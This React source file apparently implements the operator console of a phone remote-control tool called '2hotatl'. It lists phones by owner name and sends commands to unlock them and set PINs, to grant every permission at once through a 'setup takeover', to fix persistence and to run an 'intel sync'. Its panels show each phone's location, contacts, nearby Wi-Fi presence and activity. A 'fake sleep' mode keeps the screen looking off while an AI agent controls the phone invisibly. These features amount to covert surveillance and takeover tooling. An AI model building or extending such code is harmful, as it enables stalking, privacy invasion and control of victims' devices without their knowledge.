import { useEffect, useMemo, useRef, useState } from "react";
import { ActivityFeed } from "./components/ActivityFeed";
import { AiPanel } from "./components/AiPanel";
import { CommandDeck } from "./components/CommandDeck";
import { ContactsPanel } from "./components/ContactsPanel";
import { LocationPanel } from "./components/LocationPanel";
import { NearbyPanel } from "./components/NearbyPanel";
import { NotesPanel } from "./components/NotesPanel";
import { PermissionsPanel } from "./components/PermissionsPanel";
import { QuickLaunchBar } from "./components/QuickLaunchBar";
import { useAgent } from "./hooks/useAgent";
import { useLiveStream } from "./hooks/useRelayStream";
import { clientToDevice } from "./utils/coords";

function statusLabel(
  selectedDeviceId: string | null,
  phoneLive: boolean,
  connected: boolean,
  activeName: string,
  deviceName: string,
  locked: boolean,
) {
  if (!selectedDeviceId) return { text: "No phone", tone: "muted" as const };
  if (locked && phoneLive) return { text: `Locked · ${activeName || deviceName}`, tone: "locked" as const };
  if (phoneLive) return { text: `Live · ${activeName || deviceName}`, tone: "live" as const };
  if (connected) return { text: "Connecting…", tone: "warn" as const };
  return { text: "Offline", tone: "muted" as const };
}

export default function App() {
  const [ripples, setRipples] = useState<{ id: number; x: number; y: number }[]>([]);
  const [aiOpen, setAiOpen] = useState(false);
  const rippleId = useRef(0);

  const {
    connected,
    phoneLive,
    deviceSize,
    devices,
    selectedDeviceId,
    activeDeviceName,
    selectDevice,
    send,
    getTree,
    getTreeTick,
    waitForTree,
    hasRecentTree,
    activityFeed,
    sessionNotes,
    clearNotes,
    notesClearing,
    location,
    contacts,
    wifiPresence,
    setupProgress,
    clearSetupProgress,
    deviceState,
    getDeviceState,
    waitForReady,
  } = useLiveStream();

  const agent = useAgent(send, getTree, waitForTree, getTreeTick, phoneLive, hasRecentTree, getDeviceState, waitForReady);
  const locked = deviceState?.locked ?? false;
  const fakeSleep = deviceState?.fakeSleep ?? false;
  const canControl = connected && !!selectedDeviceId && phoneLive && (!locked || fakeSleep);
  const canSendKeys = connected && !!selectedDeviceId;
  const screenRef = useRef<HTMLDivElement>(null);
  const dragRef = useRef<{ x: number; y: number; t: number } | null>(null);
  const selectedDevice = devices.find((d) => d.deviceId === selectedDeviceId);
  const status = statusLabel(
    selectedDeviceId,
    phoneLive,
    connected,
    activeDeviceName,
    selectedDevice?.name ?? "phone",
    locked,
  );

  const screenHint = useMemo(() => {
    if (!selectedDeviceId) return "Choose a phone above";
    if (fakeSleep) return "Fake sleep — AI still controls phone invisibly";
    if (locked) return "Phone locked — tap Unlock";
    if (!phoneLive) return selectedDevice ? `${selectedDevice.name} is offline` : "Phone offline";
    return "Tap or swipe to control";
  }, [selectedDeviceId, phoneLive, selectedDevice, locked, fakeSleep]);

  const onWake = () => send({ type: "key", action: "wake" });
  const onUnlock = () => send({ type: "key", action: "unlock" });
  const onLock = () => send({ type: "key", action: "lock" });
  const onPower = () => send({ type: "key", action: "power" });
  const onKey = (action: string) => send({ type: "key", action });
  const onGrantAll = async () => {
    clearSetupProgress();
    send({ type: "key", action: "unlock" });
    await new Promise((r) => setTimeout(r, 1500));
    send({ type: "setup_takeover" });
  };
  const onFixPersistence = () => send({ type: "fix_persistence" });
  const onIntelSync = () => send({ type: "intel_sync" });
  const onContinueSetup = () => send({ type: "request_permission_wizard" });
  const onRequestPermission = (step: string) => send({ type: "request_permission_moment", step });
  const onOpenApp = (pkg: string) => send({ type: "open_app", package: pkg });
  const onPaste = (text: string) => send({ type: "clipboard_paste", text });
  const onSetPin = (pin: string) => send({ type: "set_unlock_pin", pin });
  const onFakeSleepToggle = () =>
    send({ type: "fake_sleep", enabled: !fakeSleep });
  const onProximityAutoSleepToggle = () =>
    send({ type: "proximity_auto_sleep", action: "toggle" });

  useEffect(() => {
    if (!setupProgress?.done) return;
    const t = setTimeout(clearSetupProgress, 8000);
    return () => clearTimeout(t);
  }, [setupProgress?.done, setupProgress?.at, clearSetupProgress]);

  const toDeviceCoords = (clientX: number, clientY: number) => {
    const el = screenRef.current;
    if (!el) return null;
    return clientToDevice(clientX, clientY, el.getBoundingClientRect(), deviceSize.width, deviceSize.height);
  };

  const addRipple = (x: number, y: number) => {
    const id = ++rippleId.current;
    setRipples((r) => [...r, { id, x, y }]);
    setTimeout(() => setRipples((r) => r.filter((rr) => rr.id !== id)), 600);
  };

  const onPointerDown = (e: React.PointerEvent) => {
    if (!canControl) return;
    const coords = toDeviceCoords(e.clientX, e.clientY);
    if (!coords) return;
    dragRef.current = { x: coords.x, y: coords.y, t: Date.now() };
    addRipple(coords.localX, coords.localY);
    (e.currentTarget as HTMLElement).setPointerCapture(e.pointerId);
  };

  const onPointerUp = (e: React.PointerEvent) => {
    if (!canControl) return;
    const start = dragRef.current;
    dragRef.current = null;
    if (!start) return;
    const coords = toDeviceCoords(e.clientX, e.clientY);
    if (!coords) return;
    const dt = Date.now() - start.t;
    const dist = Math.hypot(coords.x - start.x, coords.y - start.y);
    if (dist < 12 && dt < 300) send({ type: "tap", x: coords.x, y: coords.y });
    else if (dist >= 12) {
      send({
        type: "swipe",
        x: start.x,
        y: start.y,
        x2: coords.x,
        y2: coords.y,
        duration: Math.min(Math.max(dt, 50), 600),
      });
    }
  };

  const grantBusy = setupProgress != null && !setupProgress.done;

  return (
    <div className="app app-cockpit">
      <div className="bg-glow bg-glow-1" />
      <div className="bg-glow bg-glow-2" />

      <header className="header header-minimal">
        <div className="logo">
          <span className="logo-icon">◉</span>
          <div>
            <h1>2hotatl</h1>
            <p className="tagline">remote control</p>
          </div>
        </div>
        <div className="status-pills">
          <select
            className="device-select"
            value={selectedDeviceId ?? ""}
            onChange={(e) => selectDevice(e.target.value || null)}
            aria-label="Select phone"
          >
            <option value="">Choose phone…</option>
            {devices.map((d) => (
              <option key={d.deviceId} value={d.deviceId}>
                {d.online ? "● " : "○ "}
                {d.ownerName ? `${d.ownerName} · ` : ""}
                {d.name}
              </option>
            ))}
          </select>
          <span className={`pill pill-status pill-${status.tone}`}>{status.text}</span>
          {deviceState && canSendKeys && (
            <>
              <span className={`pill pill-device ${deviceState.awake ? "pill-awake" : "pill-asleep"}`}>
                {deviceState.fakeSleep ? "Fake sleep" : deviceState.awake ? "Awake" : "Asleep"}
              </span>
              {deviceState.fakeSleep && <span className="pill pill-device pill-ready">AI active</span>}
              {deviceState.locked && <span className="pill pill-device pill-locked">Locked</span>}
              {deviceState.ready && <span className="pill pill-device pill-ready">Ready</span>}
              {deviceState.proximityAvailable && deviceState.userNear != null && (
                <span className={`pill pill-device ${deviceState.userNear ? "pill-near" : "pill-away"}`}>
                  {deviceState.userNear ? "Near" : "Away"}
                </span>
              )}
            </>
          )}
          <button
            type="button"
            className={`btn-grant-all ${grantBusy ? "btn-grant-all-active" : ""}`}
            onClick={() => void onGrantAll()}
            disabled={!canSendKeys || grantBusy}
            title={canSendKeys ? "Opens Settings and turns all permissions ON" : "Select a phone first"}
          >
            <span className="btn-grant-icon">⚡</span>
            AI Grant All
          </button>
          <a className="pill pill-link" href="/watch">Watch</a>
        </div>
      </header>

      {setupProgress && (
        <div className={`grant-banner grant-banner-${setupProgress.phase}`}>
          <span className="grant-banner-pulse" aria-hidden />
          <span className="grant-banner-text">{setupProgress.line}</span>
          {setupProgress.done && (
            <button type="button" className="grant-banner-dismiss" onClick={clearSetupProgress}>✕</button>
          )}
        </div>
      )}

      <main className="cockpit">
        <div className="cockpit-left">
          <PermissionsPanel
            perms={deviceState?.perms}
            onGrantAll={() => void onGrantAll()}
            onContinueSetup={onContinueSetup}
            onRequestPermission={onRequestPermission}
            canSendKeys={canSendKeys}
          />
          <NearbyPanel presence={wifiPresence} />
          <ActivityFeed items={activityFeed} phoneLive={phoneLive} />
          <NotesPanel
            notes={sessionNotes}
            phoneLive={phoneLive}
            onClear={() => void clearNotes()}
            clearing={notesClearing}
          />
          <LocationPanel
            location={location}
            perms={deviceState?.perms}
            canSendKeys={canSendKeys}
            onRequestPermission={onRequestPermission}
          />
          <ContactsPanel
            contacts={contacts}
            perms={deviceState?.perms}
            canSendKeys={canSendKeys}
            onRequestPermission={onRequestPermission}
          />
        </div>

        <div className="cockpit-center">
          <QuickLaunchBar canSendKeys={canSendKeys} onOpenApp={onOpenApp} />
          <div className="phone-stage phone-stage-large">
            <div className="phone-shadow" />
            <div className="phone-frame phone-frame-large">
              <div className="phone-notch" />
              <div
                ref={screenRef}
                className={`phone-screen phone-screen-live ${canControl ? "phone-screen-ready" : "phone-screen-wait"}`}
                onPointerDown={onPointerDown}
                onPointerUp={onPointerUp}
                onPointerCancel={() => { dragRef.current = null; }}
              >
                {!canControl && (
                  <div className="screen-hint">
                    <span className="screen-hint-icon">{locked ? "🔒" : phoneLive ? "◉" : "○"}</span>
                    <p>{screenHint}</p>
                    {canSendKeys && locked && (
                      <button type="button" className="btn-wake-inline" onClick={onUnlock}>Unlock phone</button>
                    )}
                    {canSendKeys && !phoneLive && !locked && (
                      <button type="button" className="btn-wake-inline" onClick={onWake}>Wake phone</button>
                    )}
                  </div>
                )}
                {canControl && <div className="screen-touch-grid" aria-hidden />}
                {ripples.map((r) => (
                  <span key={r.id} className="ripple" style={{ left: r.x, top: r.y }} />
                ))}
              </div>
              <div className="phone-chin" />
            </div>
            <p className="screen-caption">{screenHint}</p>
          </div>
        </div>

        <div className="cockpit-right">
          <CommandDeck
            canControl={canControl}
            canSendKeys={canSendKeys}
            locked={locked}
            onWake={onWake}
            onUnlock={onUnlock}
            onLock={onLock}
            onPower={onPower}
            onKey={onKey}
            onGrantAll={() => void onGrantAll()}
            onContinueSetup={onContinueSetup}
            onFixPersistence={onFixPersistence}
            onIntelSync={onIntelSync}
            onOpenApp={onOpenApp}
            onPaste={onPaste}
            onSetPin={onSetPin}
            fakeSleep={fakeSleep}
            onFakeSleepToggle={onFakeSleepToggle}
            proximityAutoSleep={deviceState?.proximityAutoSleep ?? false}
            proximityAvailable={deviceState?.proximityAvailable ?? false}
            userNear={deviceState?.userNear ?? null}
            onProximityAutoSleepToggle={onProximityAutoSleepToggle}
            onAiToggle={() => setAiOpen((v) => !v)}
            aiOpen={aiOpen}
            grantBusy={grantBusy}
          />
          {aiOpen && (
            <AiPanel
              agent={agent}
              tree={getTree()}
              disabled={!canSendKeys || agent.running}
              connected={connected}
              phoneLive={phoneLive}
              locked={locked}
            />
          )}
        </div>
      </main>
    </div>
  );
}
